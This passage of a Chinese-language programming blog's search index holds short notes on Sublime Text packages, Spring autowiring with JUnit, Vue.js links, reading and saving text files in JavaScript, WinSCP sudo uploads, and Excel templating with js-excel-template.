id=\"家裡-1\"><a href=\"#家裡-1\" class=\"headerlink\" title=\"家裡\"></a>家裡</h4><p> 0_package_control_loader.sublime-package<br> AdvancedNewFile.sublime-package<br> Alignment.sublime-package<br>‘All Autocomplete.sublime-package’<br>‘Bootstrap 3 Snippets.sublime-package’<br> BracketHighlighter.sublime-package<br>‘CodeIgniter Snippets.sublime-package’<br>‘CodeIgniter Utilities.sublime-package’<br> DocBlockr.sublime-package<br> Emmet.sublime-package<br> FakeDataGenerator.sublime-package<br> GhostText.sublime-package<br> Goto-CSS-Declaration.sublime-package<br> jQuery.sublime-package<br>‘Package Control.sublime-package’<br>‘PHP Getters and Setters.sublime-package’<br>‘Pretty JSON.sublime-package’<br> PyV8/<br> Sass.sublime-package<br> SqlBeautifier.sublime-package<br> StringEncode.sublime-package<br>‘Text Pastry.sublime-package’<br>‘Vuejs Snippets.sublime-package’</p>\n<h4 id=\"公司-1\"><a href=\"#公司-1\" class=\"headerlink\" title=\"公司\"></a>公司</h4><p>‘Pretty JSON’/<br>SFTP/<br>‘0Sublimerge 3’/<br>‘Theme - Default’/<br>User/</p>\n","categories":["實用工具"],"tags":["vscode","sublime"]},{"title":"Spring 自動注入小記","url":"/blog/2020/05/11/Spring-%E8%87%AA%E5%8B%95%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%A8%98/","content":"<p>自動注入筆記</p>\n<a id=\"more\"></a>\n<h2 id=\"autowired-加載方式\"><a href=\"#autowired-加載方式\" class=\"headerlink\" title=\"autowired 加載方式\"></a>autowired 加載方式</h2><h3 id=\"建構子\"><a href=\"#建構子\" class=\"headerlink\" title=\"建構子\"></a>建構子</h3><h3 id=\"成員變數\"><a href=\"#成員變數\" class=\"headerlink\" title=\"成員變數\"></a>成員變數</h3><h3 id=\"setter-method\"><a href=\"#setter-method\" class=\"headerlink\" title=\"setter method\"></a>setter method</h3><h3 id=\"任意-method\"><a href=\"#任意-method\" class=\"headerlink\" title=\"任意 method\"></a>任意 method</h3><h2 id=\"XML-自動掛載\"><a href=\"#XML-自動掛載\" class=\"headerlink\" title=\"XML 自動掛載\"></a>XML 自動掛載</h2><figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">content:component-scan</span> <span class=\"attr\">base-package</span>=<span class=\"string\">\"com.xxxx.oooo\"</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"自動載入相關-annotation\"><a href=\"#自動載入相關-annotation\" class=\"headerlink\" title=\"自動載入相關 annotation\"></a>自動載入相關 annotation</h2><h3 id=\"自動載入\"><a href=\"#自動載入\" class=\"headerlink\" title=\"自動載入\"></a>自動載入</h3><p>組間掃描<br>@Component<br>@ComponentScan</p>\n<p>自動注入<br>@Autowired</p>\n<h3 id=\"定義配置類\"><a href=\"#定義配置類\" class=\"headerlink\" title=\"定義配置類\"></a>定義配置類</h3><p>@Configuration(classes=AppConfig.class)</p>\n<h3 id=\"JUnit\"><a href=\"#JUnit\" class=\"headerlink\" title=\"JUnit\"></a>JUnit</h3><h4 id=\"安裝\"><a href=\"#安裝\" class=\"headerlink\" title=\"安裝\"></a>安裝</h4><ol>\n<li><p>設定 JUnit Library 加載<br>pom.xml 設定 spring-test,junit 如下設定參考</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">project</span> <span class=\"attr\">xmlns</span>=<span class=\"string\">\"http://maven.apache.org/POM/4.0.0\"</span> <span class=\"attr\">xmlns:xsi</span>=<span class=\"string\">\"http://www.w3.org/2001/XMLSchema-instance\"</span> <span class=\"attr\">xsi:schemaLocation</span>=<span class=\"string\">\"http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd\"</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">modelVersion</span>&gt;</span>4.0.0<span class=\"tag\">&lt;/<span class=\"name\">modelVersion</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>com.qfedu<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>spring01demo<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>0.0.1-SNAPSHOT<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">dependencies</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"comment\">&lt;!-- https://mvnrepository.com/artifact/org.springframework/spring-context --&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">\t    <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.springframework<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">\t    <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>spring-context<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">\t    <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>4.3.13.RELEASE<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>log4j<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>log4j<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>1.2.17<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>junit<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>junit<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>4.12<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.springframework<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>spring-test<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>4.3.13.RELEASE<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">dependencies</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">project</span>&gt;</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>設定 test 程式加入 設定<br>@RunWith(SpringJUnit4ClassRunner.class)<br>@ContextConfiguration(classes = AppConfig.class)</p>\n</li>\n</ol>\n<p>**這邊注意</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> hello;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> org.junit.Test;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.junit.runner.RunWith;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.test.context.ContextConfiguration;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.test.context.junit4.SpringJUnit4ClassRunner;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@RunWith</span>(SpringJUnit4ClassRunner.class)</span><br><span class=\"line\"><span class=\"meta\">@ContextConfiguration</span>(classes = AppConfig.class)</span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">testHello</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"meta\">@Autowired</span></span><br><span class=\"line\">\t<span class=\"keyword\">private</span> MessagePrinter messagePrinter;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"meta\">@Test</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">testPrint</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">\t\tmessagePrinter.printMessage();</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ol start=\"3\">\n<li>自動載入<br>@Autowired</li>\n</ol>\n<p>下面程式參考:<a href=\"https://my.oschina.net/itblog/blog/1550753\" target=\"_blank\" rel=\"noopener\">JUnit高级用法之@RunWith - 摆渡者 - OSCHINA</a><br><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@RunWith</span>(SpringJUnit4ClassRunner.class)</span><br><span class=\"line\"><span class=\"meta\">@ContextConfiguration</span>(locations = &#123; <span class=\"string\">\"classpath:applicationContext.xml\"</span> &#125;)</span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">UserManagerTest</span> </span>&#123;</span><br><span class=\"line\">　　<span class=\"meta\">@Autowired</span></span><br><span class=\"line\">　　ApplicationContext ctx;</span><br><span class=\"line\"></span><br><span class=\"line\">　　<span class=\"meta\">@Test</span></span><br><span class=\"line\">　　<span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">testAddUser</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">　　　　<span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">　　　　　　UserManager userManager = ctx.getBean(UserManager.class); </span><br><span class=\"line\">　　　　　　userManager.addUser();</span><br><span class=\"line\">　　　　&#125; <span class=\"keyword\">catch</span> (Exception e) &#123;</span><br><span class=\"line\">　　　　　　e.printStackTrace();</span><br><span class=\"line\">　　　　&#125;</span><br><span class=\"line\">　　&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"自動配裝衝突\"><a href=\"#自動配裝衝突\" class=\"headerlink\" title=\"自動配裝衝突\"></a>自動配裝衝突</h2><ol>\n<li><p>@Primary<br>在 Component 定義 @primary</p>\n</li>\n<li><p>@Qualifier<br>默認 <code>宣告</code> 和 <code>配裝</code> 使用 @Qualifier</p>\n</li>\n<li><p>@Qualifier<br>自動配裝可使用 bean id(第一個小寫)<br>@Qualifier(“helloWorld”)</p>\n</li>\n</ol>\n<h2 id=\"相關載入事情\"><a href=\"#相關載入事情\" class=\"headerlink\" title=\"相關載入事情\"></a>相關載入事情</h2><ol>\n<li>@Resource( name = “helloWorld” )</li>\n</ol>\n<p><code>@Resource( name = &quot;helloWorld&quot; )</code> 等於<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">@Autowired</span><br><span class=\"line\">@Qualifier( name = &quot;helloWorld&quot; )</span><br></pre></td></tr></table></figure></p>\n<ol start=\"2\">\n<li>@Controller , @Service, @Repository<br><code>@Controller , @Service, @Repository</code> 等於 @Component 相同功能<br>比較有語意，跟 @Component 沒什麼差別。</li>\n</ol>\n<h2 id=\"Autowired-require-false\"><a href=\"#Autowired-require-false\" class=\"headerlink\" title=\"Autowired (require = false )\"></a>Autowired (require = false )</h2><p>if(xxx == null)</p>\n<h2 id=\"指定掃描\"><a href=\"#指定掃描\" class=\"headerlink\" title=\"指定掃描\"></a>指定掃描</h2><ol>\n<li><p>@ComponentScan( “com.xxx.demo” )<br>掃描底下 “com.xxx.demo”的所有 Package</p>\n</li>\n<li><p>@ComponentScan( basePackages = {“com.xxx.demo.web”, “com.xxx.demo.service”, “com.xxx.demo.dao”})<br>解決上面不能放多個</p>\n</li>\n<li><p>@ComponentScan( basePackageClasses = {MessagePrinter.class, MessageService.class})<br>上面嚴重缺點，不能自動用程式”重構”功能，連帶修改</p>\n</li>\n</ol>\n<h2 id=\"小記\"><a href=\"#小記\" class=\"headerlink\" title=\"小記\"></a>小記</h2><p>這邊的 @Autowired 預設都是<strong>單例模式</strong><br>額且啟動服務(這邊講的是 Web )的時候，這些套件就會自動載入</p>\n<p>這邊也順便紀錄一下，Servlet 生命週期，init() 是 request 觸發的時候會觸發<br>Servlet 其實也算是只會實例一個，不是多個 Servlet 程式<br>所以在多執行緒需要注意一下問題…</p>\n","categories":["Java"],"tags":["spring","junit"]},{"title":"Vue.js簡易筆記","url":"/blog/2018/09/19/Vue-js%E7%B0%A1%E6%98%93%E7%AD%86%E8%A8%98/","content":"<p>最近使用Vue.js寫幾個範例<br>先做個備忘錄</p>\n<a id=\"more\"></a>\n<a href=\"/blog/2018/09/19/Vue-js簡易筆記/vuetest.code\" title=\"筆記連結\">筆記連結</a>\n<p>了解完可以看下面的影片，可以更進一步了解vuejs<br>如物件、陣列、virtual DOM… 等等雷<br><a href=\"https://www.youtube.com/watch?v=K8k5mkl-w4g\" target=\"_blank\" rel=\"noopener\">[Vue.js 台灣 Meetup] Style Guide 導讀 / Kuro Hsu - YouTube</a><br>EventBus的雷，刪除component記得做回收動作<br><a href=\"https://www.youtube.com/watch?v=eFtw__i7vOk\" target=\"_blank\" rel=\"noopener\">[ Alex 宅幹嘛 ] 👨‍💻Vue EventBus 使用操作與外掛開發 - YouTube</a><br>還算滿好懂的過場教學<br><a href=\"http://blog.tonycube.com/2017/06/vuejs-14-transition-animation.html?m=1\" target=\"_blank\" rel=\"noopener\">Vue.js (14) - 過場效果及動畫 | Tony Blog</a><br><a href=\"/blog/2018/09/19/Vue-js簡易筆記/2.png\" title=\"備份圖\">備份圖</a><br>有講sync跟emit的差別，其實原理都一樣，但是sync是寫死的，不用多寫東西<br><a href=\"http://www.cnblogs.com/penghuwan/p/7473375.html\" target=\"_blank\" rel=\"noopener\">【Vue】Vue中的父子组件通讯以及使用sync同步父子组件数据 - 外婆的彭湖湾 - 博客园</a><br><a href=\"/blog/2018/09/19/Vue-js簡易筆記/1.png\" title=\"備份圖\">備份圖</a></p>\n<p>live server跟json server的reload坑 (NOTE:liveServer.setttings.ignoreFiles)<br><a href=\"https://youtu.be/MCTETw0Slrw?t=1h21m51s\" target=\"_blank\" rel=\"noopener\">https://youtu.be/MCTETw0Slrw?t=1h21m51s</a></p>\n<p>vue cli electron<br><a href=\"https://wizardforcel.gitbooks.io/electron-doc/content/api/remote.html\" target=\"_blank\" rel=\"noopener\">remote | Electron 中文文档</a><br><a href=\"https://github.com/nklayman/vue-cli-plugin-electron-builder\" target=\"_blank\" rel=\"noopener\">nklayman/vue-cli-plugin-electron-builder: A Vue Cli 3 plugin for Electron with no required configuration</a><br><a href=\"https://electronjs.org/docs/api/remote#remotegetcurrentwindow\" target=\"_blank\" rel=\"noopener\">remote | Electron</a></p>\n","categories":["Vue"],"tags":["vue"]},{"title":"Web 用 JavaScript 讀 TXT 檔案方法","url":"/blog/2020/09/26/Web-%E7%94%A8-JavaScript-%E8%AE%80-TXT-%E6%AA%94%E6%A1%88%E6%96%B9%E6%B3%95/","content":"<p>最近簡單做了一個 web 文字模板<br>其實就是簡單正規化去取代<br>之前也有寫個類似東西<br>但是都要大幅度去改東西<br>不是很方便<br>但這次主要是紀錄 js 讀/寫 txt方法</p>\n<a id=\"more\"></a>\n<h2 id=\"讀\"><a href=\"#讀\" class=\"headerlink\" title=\"讀\"></a>讀</h2><p>網路上忘記從哪邊參考過來的<br>其實我loadFile this抓不到原因是我呼叫方式<br>事後才想到<br><figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">loadFile</span>(<span class=\"params\">file</span>) </span>&#123; </span><br><span class=\"line\">    <span class=\"keyword\">var</span> fr=<span class=\"keyword\">new</span> FileReader(); </span><br><span class=\"line\">  <span class=\"keyword\">var</span> that = file;</span><br><span class=\"line\">    fr.onload=<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123; </span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(fr.result);</span><br><span class=\"line\">        <span class=\"comment\">// $(that).prev().val(fr.result); </span></span><br><span class=\"line\">        <span class=\"comment\">//   chgData();</span></span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">      </span><br><span class=\"line\">    fr.readAsText(file.files[<span class=\"number\">0</span>]); </span><br><span class=\"line\">  </span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"寫\"><a href=\"#寫\" class=\"headerlink\" title=\"寫\"></a>寫</h2><p>我採用第一個</p>\n<ul>\n<li><p><a href=\"http://tsangprogramlearning.blogspot.com/2015/01/javascripttxt.html\" target=\"_blank\" rel=\"noopener\">我的程式學習心得: 【Javascript】匯出txt</a></p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">saveTextAsFile</span>(<span class=\"params\"> _fileName, _text </span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> textFileAsBlob = <span class=\"keyword\">new</span> Blob([_text], &#123;<span class=\"attr\">type</span>:<span class=\"string\">'text/plain'</span>&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">var</span> downloadLink = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">\"a\"</span>);</span><br><span class=\"line\">    downloadLink.download = _fileName;</span><br><span class=\"line\">    downloadLink.innerHTML = <span class=\"string\">\"Download File\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"built_in\">window</span>.webkitURL != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// Chrome allows the link to be clicked</span></span><br><span class=\"line\">        <span class=\"comment\">// without actually adding it to the DOM.</span></span><br><span class=\"line\">        downloadLink.href = <span class=\"built_in\">window</span>.webkitURL.createObjectURL(textFileAsBlob);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">// Firefox requires the link to be added to the DOM</span></span><br><span class=\"line\">        <span class=\"comment\">// before it can be clicked.</span></span><br><span class=\"line\">        downloadLink.href = <span class=\"built_in\">window</span>.URL.createObjectURL(textFileAsBlob);</span><br><span class=\"line\">        downloadLink.onclick = destroyClickedElement;</span><br><span class=\"line\">        downloadLink.style.display = <span class=\"string\">\"none\"</span>;</span><br><span class=\"line\">        <span class=\"built_in\">document</span>.body.appendChild(downloadLink);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    downloadLink.click();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">destroyClickedElement</span>(<span class=\"params\">event</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">document</span>.body.removeChild(event.target);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><a href=\"https://stackoverflow.com/questions/43135852/javascript-export-to-text-file\" target=\"_blank\" rel=\"noopener\">html - Javascript:: export to text file - Stack Overflow</a></p>\n</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> saveData = (<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\"><span class=\"keyword\">var</span> a = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">\"a\"</span>);</span><br><span class=\"line\"><span class=\"built_in\">document</span>.body.appendChild(a);</span><br><span class=\"line\">a.style = <span class=\"string\">\"display: none\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">return</span> <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">data, fileName</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> json = <span class=\"built_in\">JSON</span>.stringify(data),</span><br><span class=\"line\">        blob = <span class=\"keyword\">new</span> Blob([json], &#123;<span class=\"attr\">type</span>: <span class=\"string\">\"octet/stream\"</span>&#125;),</span><br><span class=\"line\">        url = <span class=\"built_in\">window</span>.URL.createObjectURL(blob);</span><br><span class=\"line\">    a.href = url;</span><br><span class=\"line\">    a.download = fileName;</span><br><span class=\"line\">    a.click();</span><br><span class=\"line\">    <span class=\"built_in\">window</span>.URL.revokeObjectURL(url);</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">&#125;());</span><br></pre></td></tr></table></figure>\n<p>另類寫法<br><a href=\"http://jsfiddle.net/onigetoc/ucsse0sj/\" target=\"_blank\" rel=\"noopener\">Download text file javascript - JSFiddle - Code Playground</a></p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">\"data:text/plain;charset=UTF-8,Hello%20World!\"</span> <span class=\"attr\">download</span>=<span class=\"string\">\"hello.txt\"</span>&gt;</span>Download (static)<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">id</span>=<span class=\"string\">\"programatically\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"\"</span> <span class=\"attr\">download</span>=<span class=\"string\">\"date.txt\"</span>&gt;</span>Download (dynamic)<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">$(<span class=\"string\">\"a#programatically\"</span>).click(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> now = <span class=\"keyword\">new</span> <span class=\"built_in\">Date</span>().toString();</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.href = <span class=\"string\">\"data:text/plain;charset=UTF-8,\"</span>  + <span class=\"built_in\">encodeURIComponent</span>(now);</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<h2 id=\"文件模板\"><a href=\"#文件模板\" class=\"headerlink\" title=\"文件模板\"></a>文件模板</h2><p>其實之前就有想做文件模板<br>但一直都沒有什麼很好想法<br>最近突然想用 js-yaml 當作設定<br>簡單寫的<del>爛code</del>範例<br><a href=\"https://jsbin.com/jovugelala/1/edit?html,js,output\" target=\"_blank\" rel=\"noopener\">JS Bin - Collaborative JavaScript Debugging</a></p>\n<p>jsbin 裡面存檔沒法運作，需要額外寫出來<br>可以直接用這個連結使用<a href=\"/blog/2020/09/26/Web-用-JavaScript-讀-TXT-檔案方法/jsbin.jovugelala.1.7z\" title=\"簡單功能連結\">簡單功能連結</a></p>\n<p>不過未來可規劃</p>\n<p>加入 </p>\n<ol>\n<li>markdown-it</li>\n<li>編輯可加入動態參數 editable</li>\n<li>進階可加入<a href=\"https://idangero.us/template7/\" target=\"_blank\" rel=\"noopener\">Template7</a>來做動態部分?</li>\n<li>動態編輯輸入欄位(input date datetime-local …等等)</li>\n<li>桌面板快速切換工作區?</li>\n</ol>\n<p>但有空了解一些 js 方法<br>之後再實作看看</p>\n<p>想想這些現在實力要花很多功力<br>所以先做個簡單版快速使用</p>\n","categories":["JavaScript"],"tags":["javascript","web","text"]},{"title":"WinSCP 用 sudo 上傳檔案的方法","url":"/blog/2021/01/10/WinSCP-%E7%94%A8-sudo-%E4%B8%8A%E5%82%B3%E6%AA%94%E6%A1%88%E7%9A%84%E6%96%B9%E6%B3%95/","content":"<p>用了這麼久都不知道<br>記錄一下</p>\n<a id=\"more\"></a>\n<p>請到裡面文章查看流程<br><a href=\"https://harry-lin.blogspot.com/2019/05/winscp-sftpsudo.html\" target=\"_blank\" rel=\"noopener\">Harry 程式筆記: [WinSCP] sftp下使用sudo上傳檔案</a> </p>\n<p>想進去root 再切換 SVP …<br>結果不能切換成功</p>\n<p>或使用 <a href=\"https://blog.csdn.net/wangmuming/article/details/41575873\" target=\"_blank\" rel=\"noopener\">Linux創建用戶後，切換用戶報This account is currently not available_wangmm0218的博客-CSDN博客</a></p>\n<h2 id=\"切換-group\"><a href=\"#切換-group\" class=\"headerlink\" title=\"切換 group\"></a>切換 group</h2><p><a href=\"https://winscp.net/forum/viewtopic.php?t=11761\" target=\"_blank\" rel=\"noopener\">Set effective/primary group of login? :: Support Forum :: WinSCP</a></p>\n<p>使用 <code>newgrp &lt;group&gt;</code>(尚未測試)</p>\n","categories":["Linux"],"tags":["winscp"]},{"title":"Word,Excel的相關template套件小記","url":"/blog/2019/05/05/Word-Excel%E7%9A%84%E7%9B%B8%E9%97%9Ctemplate%E5%A5%97%E4%BB%B6%E5%B0%8F%E8%A8%98/","content":"<p>最近朋友問我有沒有用程式方法套進去 Word<br>不過我平常沒有這個需求<br>我是有跟他提到有 合併列印、VBA<br>但是查了一下<br>竟然發現找到<a href=\"https://blog.darkthread.net/blog/pure-js-docx-template-print/?fbclid=IwAR10as2G6yN_tM4_dsY_TEFOjdA-OIXq86hG5Qe7hS6SZNd2pxZYA6loynA\" target=\"_blank\" rel=\"noopener\">【茶包射手日記】純 JavaScript DOCX 套版元件 Debug-黑暗執行緒</a><br>原來網頁版 js 就能做到這種事</p>\n<a id=\"more\"></a>\n<p>但我覺得應該還有很多東西<br>所以整理一下</p>\n<p>因為我有先找到<a href=\"https://www.npmjs.com/package/js-excel-template\" target=\"_blank\" rel=\"noopener\">js-excel-template - npm</a><br>內容兩個圖片，就讓我想馬上測試官網的範例<br>首先有很複雜的表不建議使用這個</p>\n<ol>\n<li>sheet 多筆資料不會套用</li>\n<li>塞多筆 table 資料，可能下面用總計，不會自動往下移</li>\n<li>Excel 有設定一些格式不會用</li>\n</ol>\n<p>測試程式</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">const JsExcelTemplate = require(&quot;js-excel-template/nodejs/nodejs&quot;).default;</span><br><span class=\"line\">const excelTemplate = JsExcelTemplate.fromFile(&quot;test.xlsx&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">excelTemplate.set(&quot;name&quot;, &quot;John&quot;);</span><br><span class=\"line\">excelTemplate.set(&quot;age&quot;, 123);</span><br><span class=\"line\">excelTemplate.set(&quot;now&quot;, new Date());</span><br><span class=\"line\">excelTemplate.set(&quot;isBoy&quot;, true);</span><br><span class=\"line\">excelTemplate.set(&quot;isGirl&quot;, false);</span><br><span class=\"line\"></span><br><span class=\"line\">const students = [</span><br><span class=\"line\">  &#123; name: &quot;Tommy&quot;, age: 12 &#125;,</span><br><span class=\"line\">  &#123; name: &quot;Philips&quot;, age: 13 &#125;,</span><br><span class=\"line\">  &#123; name: &quot;Sara&quot;, age: 14 &#125;,</span><br><span class=\"line\">  &#123; name: &quot;中文測試&quot;, age: 14 &#125;</span><br><span class=\"line\">];</span><br><span class=\"line\"></span><br><span class=\"line\">for (let i = 1; i &lt;= 5; i++) &#123;</span><br><span class=\"line\">  if (i &lt;= students.length) &#123;</span><br><span class=\"line\">    excelTemplate.set(`name$&#123;i&#125;`, students[i - 1].name);</span><br><span class=\"line\">    excelTemplate.set(`age$&#123;i&#125;`, students[i - 1].age);</span><br><span class=\"line\">  &#125; else &#123;</span><br><span class=\"line\">    excelTemplate.set(`name$&#123;i&#125;`, &quot;&quot;);</span><br><span class=\"line\">    excelTemplate.set(`age$&#123;i&#125;`, &quot;&quot;);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">excelTemplate.set(</span><br><span class=\"line\">  &quot;average&quot;,</span><br><span class=\"line\">  students.reduce((p, c) =&gt; p + c.age, 0) / students.length</span><br><span class=\"line\">);</span><br><span class=\"line\"></span><br><span class=\"line\">excelTemplate.set(&quot;students&quot;, students);</span><br><span class=\"line\"></span><br><span class=\"line\">// nodejs:</span><br><span class=\"line\">excelTemplate.saveAs(&quot;out.xlsx&quot;);</span><br></pre></td></tr></table></figure>\n<p>雖然不推薦，但適合做單頁式報表</p>\n<ul>\n<li><a href=\"https://templater.info/\" target=\"_blank\" rel=\"noopener\">Templater - reporting Library for .NET and Java</a></li>\n<li><a href=\"https://github.com/wilson6/NPOI-Template\" target=\"_blank\" rel=\"noopener\">GitHub - wilson6/NPOI-Template: C# 根据 NPOI 